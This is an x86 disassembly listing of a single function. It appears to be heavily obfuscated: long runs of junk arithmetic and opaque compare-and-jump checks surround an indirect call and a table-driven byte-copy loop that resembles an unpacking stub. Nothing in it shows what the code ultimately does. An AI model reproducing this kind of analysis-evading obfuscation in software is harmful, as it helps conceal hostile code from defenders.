  454483:	or     ecx,esi
  454485:	mov    edi,DWORD PTR [ebp-0x4c]
  454488:	cmp    eax,DWORD PTR ds:0x471cdc
  45448e:	je     0x454535
  454494:	add    DWORD PTR [ebp-0x4c],eax
  454497:	add    ecx,ebx
  454499:	xor    eax,eax
  45449b:	mov    esi,eax
  45449d:	add    edx,edx
  45449f:	add    edx,edx
  4544a1:	cmp    edx,0xffffff99
  4544a4:	jne    0x454535
  4544aa:	mov    eax,edx
  4544ac:	mov    edx,0x80
  4544b1:	add    esi,edi
  4544b3:	or     eax,edi
  4544b5:	sub    DWORD PTR [ebp-0x4c],esi
  4544b8:	add    DWORD PTR [ebp-0x4c],eax
  4544bb:	add    ecx,eax
  4544bd:	sub    DWORD PTR [ebp-0x4c],edx
  4544c0:	sub    ecx,edx
  4544c2:	add    ecx,eax
  4544c4:	test   ecx,0xc8200140
  4544ca:	je     0x454535
  4544cc:	mov    esi,DWORD PTR ds:0x471cdc
  4544d2:	mov    eax,DWORD PTR [ebp-0x4c]
  4544d5:	add    esi,ebx
  4544d7:	sub    DWORD PTR [ebp-0x4c],ebx
  4544da:	mov    DWORD PTR [ebp-0x2c],esi
  4544dd:	or     eax,ecx
  4544df:	and    eax,ebx
  4544e1:	add    eax,ebx
  4544e3:	add    eax,ebx
  4544e5:	cmp    eax,0xffffffae
  4544e8:	jne    0x454535
  4544ea:	xor    ecx,ecx
  4544ec:	cmp    eax,0x6e78
  4544f1:	jne    0x454535
  4544f3:	mov    edi,DWORD PTR [ebp-0x2c]
  4544f6:	xor    esi,esi
  4544f8:	mov    DWORD PTR [ebp-0x24],ecx
  4544fb:	cmp    eax,DWORD PTR ds:0x471d04
  454501:	je     0x454535
  454503:	xor    ecx,ecx
  454505:	sub    DWORD PTR [ebp-0x24],edx
  454508:	mov    edx,DWORD PTR [ebp-0x4c]
  45450b:	add    DWORD PTR [ebp-0x24],edx
  45450e:	sub    edi,esi
  454510:	add    DWORD PTR [ebp-0x2c],ecx
  454513:	and    edi,esi
  454515:	sub    eax,edi
  454517:	cmp    eax,DWORD PTR [ebp-0x18]
  45451a:	je     0x454535
  45451c:	cmp    eax,0x74
  45451f:	je     0x454535
  454521:	add    eax,esi
  454523:	sub    eax,edi
  454525:	mov    esi,edx
  454527:	sub    eax,esi
  454529:	add    eax,esi
  45452b:	mov    edx,esi
  45452d:	add    eax,edi
  45452f:	add    DWORD PTR [ebp-0x24],edx
  454532:	add    DWORD PTR [ebp-0x4c],eax
  454535:	sub    ebx,0x57f7a650
  45453b:	test   eax,0x8e
  454540:	je     0x454557
  454542:	add    ecx,ecx
  454544:	mov    edx,ecx
  454546:	add    DWORD PTR [ebp-0x4c],ecx
  454549:	sub    DWORD PTR [ebp-0x4c],ebx
  45454c:	mov    eax,0x76
  454551:	and    DWORD PTR [ebp-0x4c],eax
  454554:	add    DWORD PTR [ebp-0x4c],edx
  454557:	call   DWORD PTR [ebx]
  454559:	and    esi,ebx
  45455b:	cmp    esi,0xffffff9a
  45455e:	je     0x454565
  454560:	sub    esi,ebx
  454562:	sub    DWORD PTR [ebp-0x4c],esi
  454565:	mov    DWORD PTR [ebp-0x20],eax
  454568:	cmp    eax,DWORD PTR [ebp-0x34]
  45456b:	jne    0x45458f
  45456d:	cmp    eax,0x61af
  454572:	je     0x45458f
  454574:	mov    ebx,0xb2
  454579:	mov    esi,0x9f
  45457e:	add    DWORD PTR [ebp-0x4c],ebx
  454581:	add    edi,esi
  454583:	xor    DWORD PTR [ebp-0x4c],esi
  454586:	add    edi,edi
  454588:	add    edi,edi
  45458a:	add    edi,edi
  45458c:	or     DWORD PTR [ebp-0x4c],edi
  45458f:	mov    edx,0xc15512e9
  454594:	mov    ecx,0x80
  454599:	sub    DWORD PTR [ebp-0x4c],edx
  45459c:	add    DWORD PTR [ebp-0x4c],eax
  45459f:	mov    esi,DWORD PTR [ebp-0x4c]
  4545a2:	sub    esi,edx
  4545a4:	xor    DWORD PTR [ebp-0x4c],ecx
  4545a7:	add    DWORD PTR [ebp-0x4c],edx
  4545aa:	cmp    esi,edi
  4545ac:	je     0x4545b1
  4545ae:	sub    DWORD PTR [ebp-0x4c],esi
  4545b1:	add    edx,0x3eebfd17
  4545b7:	mov    ecx,esi
  4545b9:	mov    eax,DWORD PTR ds:0x471d18
  4545bf:	sub    eax,edx
  4545c1:	add    DWORD PTR [ebp-0x4c],esi
  4545c4:	add    ecx,ecx
  4545c6:	cmp    ecx,0xffffffdc
  4545c9:	je     0x4547dc
  4545cf:	mov    edi,DWORD PTR ds:0x471d78
  4545d5:	mov    esi,DWORD PTR [ebp-0x4c]
  4545d8:	or     DWORD PTR [ebp-0x4c],eax
  4545db:	sub    ecx,edi
  4545dd:	cmp    esi,edx
  4545df:	jne    0x4547dc
  4545e5:	mov    ebx,eax
  4545e7:	mov    edi,DWORD PTR [ebp-0x4c]
  4545ea:	sub    ecx,esi
  4545ec:	or     ecx,ebx
  4545ee:	cmp    edi,DWORD PTR ds:0x471d18
  4545f4:	je     0x4547dc
  4545fa:	mov    eax,DWORD PTR [ebp-0x4c]
  4545fd:	mov    esi,DWORD PTR [ebp-0x4c]
  454600:	and    edi,edx
  454602:	cmp    esi,DWORD PTR ds:0x471d04
  454608:	jne    0x4547dc
  45460e:	mov    ebx,DWORD PTR [ebp-0x4c]
  454611:	and    eax,ecx
  454613:	sub    eax,edi
  454615:	cmp    ebx,0xffffffb2
  454618:	jne    0x4547dc
  45461e:	sub    esi,edi
  454620:	mov    edi,DWORD PTR [ebp-0x4c]
  454623:	sub    eax,ecx
  454625:	cmp    edi,esi
  454627:	je     0x4547dc
  45462d:	test   ecx,0xaf77
  454633:	jne    0x4547dc
  454639:	mov    ecx,DWORD PTR ds:0x471d04
  45463f:	add    edi,ecx
  454641:	add    edi,edx
  454643:	cmp    eax,0x4e
  454646:	je     0x4547dc
  45464c:	mov    ecx,0x74
  454651:	cmp    edi,0x9
  454654:	jne    0x4547dc
  45465a:	sub    DWORD PTR [ebp-0x4c],esi
  45465d:	mov    esi,DWORD PTR [ebp-0x4c]
  454660:	cmp    eax,DWORD PTR [ebp-0x24]
  454663:	je     0x4547dc
  454669:	sub    edi,ecx
  45466b:	mov    ecx,DWORD PTR ds:0x471cdc
  454671:	sub    ebx,edx
  454673:	sub    DWORD PTR [ebp-0x4c],eax
  454676:	and    ebx,eax
  454678:	add    DWORD PTR [ebp-0x4c],ebx
  45467b:	or     DWORD PTR [ebp-0x4c],esi
  45467e:	and    edi,edx
  454680:	sub    ecx,esi
  454682:	mov    DWORD PTR [ebp-0x4c],ecx
  454685:	sub    edi,esi
  454687:	test   edi,0xe0
  45468d:	jne    0x4547dc
  454693:	cmp    esi,0xffffffbf
  454696:	je     0x4547dc
  45469c:	mov    eax,0xab8
  4546a1:	mov    ebx,DWORD PTR [ebp-0x4c]
  4546a4:	cmp    ebx,DWORD PTR ds:0x471d04
  4546aa:	je     0x4546c9
  4546ac:	cmp    ebx,DWORD PTR ds:0x471d18
  4546b2:	je     0x4546c9
  4546b4:	or     DWORD PTR [ebp-0x4c],edi
  4546b7:	test   ebx,0x3
  4546bd:	je     0x4546c9
  4546bf:	cmp    ebx,0x66
  4546c2:	je     0x4546c9
  4546c4:	sub    ebx,ecx
  4546c6:	sub    DWORD PTR [ebp-0x4c],ebx
  4546c9:	add    eax,ecx
  4546cb:	sub    eax,edx
  4546cd:	cmp    ecx,DWORD PTR ds:0x471d04
  4546d3:	je     0x4547dc
  4546d9:	mov    ecx,DWORD PTR [ebp-0x4c]
  4546dc:	mov    ebx,DWORD PTR [ebp-0x4c]
  4546df:	add    DWORD PTR [ebp-0x4c],ecx
  4546e2:	sub    ebx,edi
  4546e4:	cmp    ebx,DWORD PTR [ebp-0x18]
  4546e7:	jne    0x4547dc
  4546ed:	xor    ecx,ecx
  4546ef:	mov    edi,DWORD PTR [ebp-0x4c]
  4546f2:	add    eax,ebx
  4546f4:	add    ecx,edx
  4546f6:	sub    ecx,edx
  4546f8:	and    eax,esi
  4546fa:	cmp    edi,0xffffffd6
  4546fd:	je     0x4547dc
  454703:	xor    ebx,ebx
  454705:	test   edi,0x3d
  45470b:	jne    0x4547dc
  454711:	add    ecx,ebx
  454713:	add    DWORD PTR [ebp-0x4c],edi
  454716:	sub    DWORD PTR [ebp-0x4c],ecx
  454719:	mov    edi,DWORD PTR [ebp-0x4c]
  45471c:	cmp    eax,esi
  45471e:	jne    0x4547dc
  454724:	cmp    eax,DWORD PTR [ebp-0x50]
  454727:	jne    0x4547dc
  45472d:	add    edi,edx
  45472f:	add    DWORD PTR [ebp-0x4c],eax
  454732:	sub    DWORD PTR [ebp-0x4c],ebx
  454735:	mov    esi,DWORD PTR [ebp-0x4c]
  454738:	cmp    edi,DWORD PTR [ebp-0x44]
  45473b:	jne    0x4547dc
  454741:	mov    ebx,0x48
  454746:	mov    ecx,DWORD PTR [ebp-0x4c]
  454749:	add    esi,edx
  45474b:	cmp    ecx,DWORD PTR ds:0x471cdc
  454751:	jne    0x4547dc
  454757:	mov    eax,0x76
  45475c:	cmp    edi,DWORD PTR ds:0x471d18
  454762:	je     0x4547dc
  454764:	or     esi,ecx
  454766:	sub    DWORD PTR [ebp-0x4c],ebx
  454769:	test   edi,0x4d11
  45476f:	jne    0x4547dc
  454771:	add    esi,eax
  454773:	add    esi,ecx
  454775:	sub    esi,eax
  454777:	mov    ebx,0xa429
  45477c:	mov    eax,esi
  45477e:	sub    ebx,edx
  454780:	mov    DWORD PTR [ebp-0x4c],ecx
  454783:	cmp    eax,DWORD PTR ds:0x471cdc
  454789:	je     0x4547dc
  45478b:	cmp    edi,DWORD PTR [ebp-0x48]
  45478e:	jne    0x4547dc
  454790:	cmp    edi,0xffffffae
  454793:	je     0x4547dc
  454795:	or     DWORD PTR [ebp-0x4c],ebx
  454798:	cmp    edi,DWORD PTR [ebp-0x8]
  45479b:	jne    0x4547dc
  45479d:	sub    DWORD PTR [ebp-0x4c],edi
  4547a0:	mov    ecx,DWORD PTR ds:0x471d78
  4547a6:	and    ecx,edx
  4547a8:	mov    edi,DWORD PTR [ebp-0x4c]
  4547ab:	and    edi,ecx
  4547ad:	add    edi,ecx
  4547af:	and    eax,esi
  4547b1:	cmp    edi,esi
  4547b3:	jne    0x4547dc
  4547b5:	cmp    edi,DWORD PTR ds:0x471d78
  4547bb:	je     0x4547dc
  4547bd:	cmp    eax,DWORD PTR [ebp-0x18]
  4547c0:	je     0x4547dc
  4547c2:	and    eax,edi
  4547c4:	mov    edi,DWORD PTR [ebp-0x4c]
  4547c7:	mov    DWORD PTR [ebp-0x10],esi
  4547ca:	sub    DWORD PTR [ebp-0x10],eax
  4547cd:	mov    ebx,0xc7
  4547d2:	and    edi,ebx
  4547d4:	sub    edi,ebx
  4547d6:	and    DWORD PTR [ebp-0x4c],ecx
  4547d9:	add    DWORD PTR [ebp-0x10],edi
  4547dc:	mov    DWORD PTR [ebp-0x14],edx
  4547df:	cmp    esi,0x61
  4547e2:	jne    0x4547f5
  4547e4:	mov    esi,edi
  4547e6:	add    esi,edx
  4547e8:	add    esi,edx
  4547ea:	cmp    esi,DWORD PTR ds:0x471d04
  4547f0:	jne    0x4547f5
  4547f2:	sub    DWORD PTR [ebp-0x4c],esi
  4547f5:	mov    edi,DWORD PTR [ebp-0x20]
  4547f8:	xor    eax,eax
  4547fa:	sub    DWORD PTR [ebp-0x4c],esi
  4547fd:	and    eax,esi
  4547ff:	and    eax,ecx
  454801:	add    eax,edi
  454803:	and    eax,edi
  454805:	cmp    eax,0xffffffa3
  454808:	jne    0x454925
  45480e:	mov    ebx,0x84204000
  454813:	mov    ecx,DWORD PTR [ebp-0x4c]
  454816:	sub    ebx,esi
  454818:	add    ecx,ebx
  45481a:	and    eax,edx
  45481c:	cmp    ebx,eax
  45481e:	je     0x454925
  454824:	cmp    eax,DWORD PTR [ebp-0x24]
  454827:	jne    0x454925
  45482d:	and    eax,edx
  45482f:	mov    esi,DWORD PTR [ebp-0x4c]
  454832:	sub    esi,eax
  454834:	cmp    esi,DWORD PTR ds:0x471d04
  45483a:	jne    0x454925
  454840:	add    ecx,edx
  454842:	mov    ebx,edi
  454844:	or     DWORD PTR [ebp-0x4c],ebx
  454847:	and    esi,eax
  454849:	add    DWORD PTR [ebp-0x4c],ebx
  45484c:	mov    ebx,DWORD PTR [ebp-0x4c]
  45484f:	or     DWORD PTR [ebp-0x4c],ecx
  454852:	sub    esi,eax
  454854:	and    esi,edi
  454856:	cmp    esi,DWORD PTR ds:0x471d04
  45485c:	je     0x454925
  454862:	sub    DWORD PTR [ebp-0x4c],edx
  454865:	cmp    ebx,DWORD PTR ds:0x471d18
  45486b:	je     0x454925
  454871:	cmp    ebx,DWORD PTR [ebp-0x8]
  454874:	je     0x454925
  45487a:	mov    eax,DWORD PTR ds:0x471cd0
  454880:	mov    DWORD PTR [ebp-0x4c],esi
  454883:	mov    ecx,DWORD PTR ds:0x471d04
  454889:	sub    ecx,edx
  45488b:	add    ebx,ecx
  45488d:	and    DWORD PTR [ebp-0x4c],edi
  454890:	cmp    ebx,0x5f
  454893:	jne    0x454925
  454899:	mov    ecx,DWORD PTR [ebp-0x4c]
  45489c:	mov    edx,0x8e
  4548a1:	or     DWORD PTR [ebp-0x4c],eax
  4548a4:	and    DWORD PTR [ebp-0x4c],esi
  4548a7:	cmp    ebx,0x64
  4548aa:	je     0x454925
  4548ac:	mov    edx,DWORD PTR [ebp-0x4c]
  4548af:	mov    eax,DWORD PTR [ebp-0x4c]
  4548b2:	add    eax,ebx
  4548b4:	add    edx,ecx
  4548b6:	add    edx,edx
  4548b8:	test   eax,0xc6
  4548bd:	jne    0x454925
  4548bf:	mov    ebx,DWORD PTR ds:0x471d78
  4548c5:	mov    ecx,0x74
  4548ca:	add    eax,edx
  4548cc:	test   eax,0x91
  4548d1:	je     0x454925
  4548d3:	mov    esi,DWORD PTR [ebp-0x4c]
  4548d6:	mov    ecx,DWORD PTR [ebp-0x4c]
  4548d9:	add    DWORD PTR [ebp-0x4c],ecx
  4548dc:	cmp    esi,0xffffffce
  4548df:	je     0x454925
  4548e1:	mov    edx,0xe4
  4548e6:	and    ebx,edi
  4548e8:	or     DWORD PTR [ebp-0x4c],eax
  4548eb:	mov    eax,DWORD PTR [ebp-0x4c]
  4548ee:	and    esi,ebx
  4548f0:	sub    eax,edi
  4548f2:	add    esi,ecx
  4548f4:	sub    edx,ecx
  4548f6:	sub    DWORD PTR [ebp-0x4c],esi
  4548f9:	cmp    edx,DWORD PTR ds:0x471cd0
  4548ff:	jne    0x454925
  454901:	add    eax,edx
  454903:	cmp    eax,ecx
  454905:	jne    0x454925
  454907:	sub    eax,ebx
  454909:	cmp    ecx,DWORD PTR ds:0x471cd0
  45490f:	je     0x454925
  454911:	xor    ebx,ebx
  454913:	sub    DWORD PTR [ebp-0x4c],eax
  454916:	xor    esi,esi
  454918:	sub    DWORD PTR [ebp-0x4c],edx
  45491b:	or     DWORD PTR [ebp-0x4c],esi
  45491e:	and    ebx,eax
  454920:	add    ebx,edi
  454922:	add    DWORD PTR [ebp-0x4c],ebx
  454925:	cmp    edx,0xffffffc5
  454928:	je     0x4549b5
  45492e:	mov    ebx,DWORD PTR [ebp-0x4c]
  454931:	mov    esi,DWORD PTR [ebp-0x4c]
  454934:	cmp    esi,0xfffffffe
  454937:	je     0x4549b5
  454939:	sub    ebx,ecx
  45493b:	mov    eax,ecx
  45493d:	add    DWORD PTR [ebp-0x4c],edx
  454940:	sub    esi,ecx
  454942:	cmp    eax,DWORD PTR ds:0x471d78
  454948:	je     0x4549b5
  45494a:	cmp    esi,eax
  45494c:	jne    0x4549b5
  45494e:	mov    ecx,DWORD PTR [ebp-0x4c]
  454951:	cmp    edi,0x41
  454954:	je     0x4549b5
  454956:	add    DWORD PTR [ebp-0x4c],ebx
  454959:	sub    esi,edi
  45495b:	mov    ebx,edi
  45495d:	sub    DWORD PTR [ebp-0x4c],ebx
  454960:	cmp    ecx,0x40110a89
  454966:	je     0x4549b5
  454968:	mov    ebx,DWORD PTR [ebp-0x4c]
  45496b:	or     ecx,esi
  45496d:	mov    esi,DWORD PTR [ebp-0x4c]
  454970:	sub    ebx,edx
  454972:	xor    DWORD PTR [ebp-0x4c],ecx
  454975:	add    esi,esi
  454977:	xor    DWORD PTR [ebp-0x4c],eax
  45497a:	cmp    ebx,DWORD PTR [ebp-0x24]
  45497d:	je     0x4549b5
  45497f:	add    DWORD PTR [ebp-0x4c],esi
  454982:	cmp    ebx,0x53
  454985:	jne    0x4549b5
  454987:	xor    eax,eax
  454989:	or     eax,ecx
  45498b:	mov    esi,0xcf
  454990:	cmp    edi,DWORD PTR ds:0x471cd0
  454996:	je     0x4549b5
  454998:	add    ebx,esi
  45499a:	and    eax,edx
  45499c:	add    ebx,esi
  45499e:	test   eax,0xc7
  4549a3:	je     0x4549b5
  4549a5:	and    DWORD PTR [ebp-0x4c],ebx
  4549a8:	cmp    eax,DWORD PTR ds:0x471d04
  4549ae:	jne    0x4549b5
  4549b0:	sub    eax,edi
  4549b2:	sub    DWORD PTR [ebp-0x4c],eax
  4549b5:	mov    ebx,DWORD PTR [ebp-0x14]
  4549b8:	cmp    ebx,0xffffffa3
  4549bb:	je     0x4549e4
  4549bd:	sub    eax,ecx
  4549bf:	mov    ecx,DWORD PTR [ebp-0x4c]
  4549c2:	add    DWORD PTR [ebp-0x4c],ecx
  4549c5:	mov    esi,DWORD PTR [ebp-0x4c]
  4549c8:	cmp    eax,edx
  4549ca:	jne    0x4549e4
  4549cc:	cmp    esi,0x7a
  4549cf:	jne    0x4549e4
  4549d1:	or     DWORD PTR [ebp-0x4c],esi
  4549d4:	xor    ecx,ecx
  4549d6:	xor    esi,esi
  4549d8:	add    esi,edx
  4549da:	sub    DWORD PTR [ebp-0x4c],ecx
  4549dd:	add    esi,eax
  4549df:	sub    esi,ecx
  4549e1:	sub    DWORD PTR [ebp-0x4c],esi
  4549e4:	mov    esi,DWORD PTR [ebx]
  4549e6:	mov    ecx,eax
  4549e8:	mov    eax,DWORD PTR [ebp-0x4c]
  4549eb:	cmp    eax,DWORD PTR [ebp-0x30]
  4549ee:	jne    0x4549fa
  4549f0:	sub    eax,esi
  4549f2:	and    ecx,ebx
  4549f4:	and    DWORD PTR [ebp-0x4c],eax
  4549f7:	or     DWORD PTR [ebp-0x4c],ecx
  4549fa:	mov    ecx,DWORD PTR [ebx+0x4]
  4549fd:	or     eax,esi
  4549ff:	mov    ebx,0x44012005
  454a04:	add    DWORD PTR [ebp-0x4c],eax
  454a07:	or     DWORD PTR [ebp-0x4c],ebx
  454a0a:	or     esi,esi
  454a0c:	je     0x454a5d
  454a0e:	mov    ebx,DWORD PTR [ebp-0x4c]
  454a11:	sub    ebx,esi
  454a13:	xor    DWORD PTR [ebp-0x4c],ebx
  454a16:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  454a18:	mov    ebx,ecx
  454a1a:	mov    eax,DWORD PTR [ebp-0x4c]
  454a1d:	cmp    edi,DWORD PTR [ebp-0x18]
  454a20:	jne    0x454a2b
  454a22:	cmp    edi,eax
  454a24:	je     0x454a2b
  454a26:	and    ebx,eax
  454a28:	sub    DWORD PTR [ebp-0x4c],ebx
  454a2b:	add    DWORD PTR [ebp-0x14],0x8
  454a2f:	and    eax,ebx
  454a31:	mov    ebx,0xd2
  454a36:	and    eax,esi
  454a38:	sub    ebx,edi
  454a3a:	cmp    eax,DWORD PTR ds:0x471cd0
  454a40:	jne    0x454a58
  454a42:	add    ebx,edx
  454a44:	add    eax,esi
  454a46:	cmp    eax,DWORD PTR [ebp-0x40]
  454a49:	jne    0x454a58
  454a4b:	cmp    eax,DWORD PTR ds:0x471cdc
  454a51:	je     0x454a58
  454a53:	sub    ebx,eax
  454a55:	mov    DWORD PTR [ebp-0x4c],ebx
  454a58:	jmp    0x4547f8
  454a5d:	and    ecx,esi
  454a5f:	test   eax,0x7ed9
  454a64:	jne    0x454a99
  454a66:	mov    esi,DWORD PTR [ebp-0x4c]
  454a69:	mov    edi,DWORD PTR [ebp-0x4c]
  454a6c:	cmp    edx,DWORD PTR [ebp-0x24]
  454a6f:	je     0x454a99
  454a71:	mov    eax,DWORD PTR [ebp-0x4c]
  454a74:	add    esi,eax
  454a76:	xor    eax,eax
  454a78:	cmp    ecx,0xfffffff8
  454a7b:	jne    0x454a99
  454a7d:	add    ecx,esi
  454a7f:	sub    DWORD PTR [ebp-0x4c],edi
  454a82:	xor    edx,edx
  454a84:	and    edx,eax
  454a86:	add    edx,ebx
  454a88:	add    DWORD PTR [ebp-0x4c],edx
  454a8b:	mov    edi,ebx
  454a8d:	add    DWORD PTR [ebp-0x4c],edx
  454a90:	add    DWORD PTR [ebp-0x4c],esi
  454a93:	add    DWORD PTR [ebp-0x4c],ecx
  454a96:	sub    DWORD PTR [ebp-0x4c],edi
  454a99:	mov    ecx,0x4440c000
  454a9e:	cmp    edi,DWORD PTR ds:0x471d78
  454aa4:	je     0x454acf
  454aa6:	cmp    edi,0xffffffd2
  454aa9:	jne    0x454acf
  454aab:	mov    esi,DWORD PTR [ebp-0x4c]
  454aae:	mov    DWORD PTR [ebp-0x4c],esi
  454ab1:	mov    edi,DWORD PTR [ebp-0x4c]
  454ab4:	add    DWORD PTR [ebp-0x4c],edi
  454ab7:	add    edx,eax
  454ab9:	cmp    edx,ecx
  454abb:	je     0x454acf
  454abd:	mov    esi,0x1f
  454ac2:	xor    ebx,ebx
  454ac4:	and    ecx,esi
  454ac6:	sub    DWORD PTR [ebp-0x4c],ecx
  454ac9:	add    DWORD PTR [ebp-0x4c],edx
  454acc:	or     DWORD PTR [ebp-0x4c],ebx
  454acf:	mov    eax,DWORD PTR [ebp-0x20]
  454ad2:	mov    ecx,DWORD PTR [ebp-0x4c]
  454ad5:	cmp    ecx,DWORD PTR ds:0x471d04
  454adb:	je     0x454ae2
  454add:	and    ecx,ebx
  454adf:	mov    DWORD PTR [ebp-0x4c],ecx
  454ae2:	mov    ecx,DWORD PTR [ebp-0x4c]
  454ae5:	cmp    ecx,DWORD PTR [ebp-0x4]
  454ae8:	je     0x454aef
  454aea:	and    ecx,eax
  454aec:	add    DWORD PTR [ebp-0x4c],ecx
  454aef:	pop    edi
  454af0:	or     ebx,edx
  454af2:	add    ebx,ecx
  454af4:	mov    ecx,DWORD PTR ds:0x471d10
  454afa:	mov    edx,DWORD PTR ds:0x471cc4
  454b00:	cmp    edi,DWORD PTR [ebp-0x30]
  454b03:	je     0x454b2f
  454b05:	mov    esi,0xf0
  454b0a:	test   ebx,0x13
  454b10:	je     0x454b2f
  454b12:	add    DWORD PTR [ebp-0x4c],edx
  454b15:	sub    DWORD PTR [ebp-0x4c],esi
  454b18:	sub    DWORD PTR [ebp-0x4c],edx
  454b1b:	or     DWORD PTR [ebp-0x4c],esi
  454b1e:	and    ecx,ebx
  454b20:	sub    ecx,ebx
  454b22:	mov    esi,edx
  454b24:	add    DWORD PTR [ebp-0x4c],ecx
  454b27:	add    DWORD PTR [ebp-0x4c],edi
  454b2a:	and    edx,esi
  454b2c:	or     DWORD PTR [ebp-0x4c],edx
  454b2f:	pop    esi
  454b30:	or     ebx,ecx
  454b32:	mov    ecx,0x45
  454b37:	mov    edx,DWORD PTR [ebp-0x4c]
  454b3a:	mov    DWORD PTR [ebp-0x4c],ecx
  454b3d:	or     DWORD PTR [ebp-0x4c],ebx
  454b40:	test   edx,0x6e
  454b46:	jne    0x454bb7
  454b48:	mov    ebx,DWORD PTR ds:0x471cdc
  454b4e:	sub    DWORD PTR [ebp-0x4c],edx
  454b51:	cmp    edx,DWORD PTR ds:0x471d04
  454b57:	je     0x454bb7
  454b59:	add    ebx,ebx
  454b5b:	mov    ecx,DWORD PTR ds:0x471d0c
  454b61:	cmp    esi,ebx
  454b63:	jne    0x454bb7
  454b65:	add    DWORD PTR [ebp-0x4c],eax
  454b68:	mov    edx,DWORD PTR ds:0x471d18
  454b6e:	mov    ecx,0x58
  454b73:	and    ecx,esi
  454b75:	or     DWORD PTR [ebp-0x4c],edx
  454b78:	sub    DWORD PTR [ebp-0x4c],ebx
  454b7b:	sub    ecx,edx
  454b7d:	and    ecx,edx
  454b7f:	cmp    ecx,0xfffffffc
  454b82:	jne    0x454bb7
  454b84:	mov    ebx,DWORD PTR [ebp-0x4c]
  454b87:	mov    edx,0x2224
  454b8c:	sub    DWORD PTR [ebp-0x4c],ecx
  454b8f:	cmp    ebx,eax
  454b91:	je     0x454bb7
  454b93:	mov    ecx,DWORD PTR [ebp-0x4c]
  454b96:	sub    DWORD PTR [ebp-0x4c],ecx
  454b99:	and    edx,ecx
  454b9b:	mov    ecx,DWORD PTR [ebp-0x4c]
  454b9e:	sub    ebx,esi
  454ba0:	add    ecx,edi
  454ba2:	cmp    ecx,0xffffff9b
  454ba5:	jne    0x454bb7
  454ba7:	or     DWORD PTR [ebp-0x4c],ebx
  454baa:	sub    DWORD PTR [ebp-0x4c],ecx
  454bad:	sub    edx,ebx
  454baf:	add    DWORD PTR [ebp-0x4c],esi
  454bb2:	add    edx,eax
  454bb4:	or     DWORD PTR [ebp-0x4c],edx
  454bb7:	pop    ebx
  454bb8:	cmp    ecx,0x45
  454bbb:	je     0x454bdb
  454bbd:	mov    edx,DWORD PTR [ebp-0x4c]
  454bc0:	mov    ecx,DWORD PTR [ebp-0x4c]
  454bc3:	or     DWORD PTR [ebp-0x4c],ebx
  454bc6:	add    DWORD PTR [ebp-0x4c],edx
  454bc9:	cmp    ecx,0x7d
  454bcc:	jne    0x454bdb
  454bce:	mov    edx,0x15
  454bd3:	mov    DWORD PTR [ebp-0x4c],ecx
  454bd6:	sub    edx,esi
  454bd8:	sub    DWORD PTR [ebp-0x4c],edx
  454bdb:	leave  
  454bdc:	ret    
